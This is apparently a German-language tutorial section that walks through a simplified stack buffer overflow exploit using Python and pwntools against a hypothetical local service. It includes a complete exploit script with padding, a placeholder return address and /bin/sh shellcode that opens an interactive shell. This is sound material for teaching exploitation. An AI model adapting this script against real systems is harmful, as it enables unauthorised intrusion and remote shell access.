# 4. Beispiel: Buffer Overflow Exploit mit Python

Im folgenden Beispiel wird ein einfacher Buffer Overflow Exploit skizziert. Das Ziel ist es, den Überlauf in einer hypothetischen, fehlerhaften Anwendung auszunutzen, um den Programmfluss zu manipulieren. (Hinweis: Dies ist ein vereinfachtes Beispiel zur Demonstration.)

#### 4.1 Szenario

* **Ziel:**\
  Eine Anwendung liest eine Benutzereingabe in einen Puffer ein, ohne die Eingabelänge zu überprüfen.
* **Schwachstelle:**\
  Überschreitet die Eingabe die erwartete Puffergröße, kann der Angreifer den Rücksprungzeiger (Return Address) überschreiben.

#### 4.2 Exploit-Aufbau

1. **Puffergröße ermitteln:**\
   Angenommen, der Puffer hat eine Größe von 64 Byte.
2.  **Shellcode einfügen:**\
    Erstelle einen Shellcode, der z. B. eine Shell startet. Pwntools kann dir dabei helfen:

    ```python
    from pwn import *

    # Beispiel: Erzeuge einen einfachen Shellcode für Linux (spawn /bin/sh)
    shellcode = asm(shellcraft.sh())
    ```
3. **Offset und Padding:**\
   Finde den Offset zum Rücksprungzeiger. Angenommen, er liegt bei 72 Byte.
4. **Return Address festlegen:**\
   Setze den Rücksprungzeiger auf eine Adresse, die auf deinen Shellcode zeigt. In einer realen Umgebung erfordert dies oft das Deaktivieren von ASLR oder das Nutzen von ROP-Gadgets.

#### 4.3 Exploit-Skript (Beispiel)

```python
#!/usr/bin/env python3
from pwn import *

# Zielparameter
target = "127.0.0.1"
port = 9999

# Lokale Verbindung zum Ziel herstellen (oder Remote)
io = remote(target, port)

# Ermittelter Offset zum Rücksprungzeiger
offset = 72

# Erzeuge den Shellcode (spawn /bin/sh)
shellcode = asm(shellcraft.sh())

# Bestimme die Zieladresse, auf die der Rücksprungzeiger zeigen soll.
# Diese Adresse muss auf den Shellcode im Puffer zeigen.
# Beispieladresse (in einer echten Umgebung durch Debugging ermitteln):
ret_addr = p32(0xdeadbeef)

# Padding: Fülle bis zum Offset
payload = b"A" * offset

# Füge den Return Address hinzu
payload += ret_addr

# Füge den Shellcode hinzu
payload += shellcode

# Sende den Exploit
io.sendline(payload)

# Wechsel in den interaktiven Modus, um die Shell zu nutzen
io.interactive()
```

**Erklärung:**

* Wir nutzen pwntools, um eine Verbindung zum Ziel aufzubauen.
* Der Payload besteht aus:
  * **Padding:** Füllt den Puffer bis zum Rücksprungzeiger (72 Byte "A").
  * **Return Address:** Überschreibt den Rücksprungzeiger mit einer Beispieladresse (0xdeadbeef).
  * **Shellcode:** Wird an die Payload angehängt. Wenn die Rücksprungadresse korrekt auf den Beginn des Shellcodes zeigt, wird dieser ausgeführt.
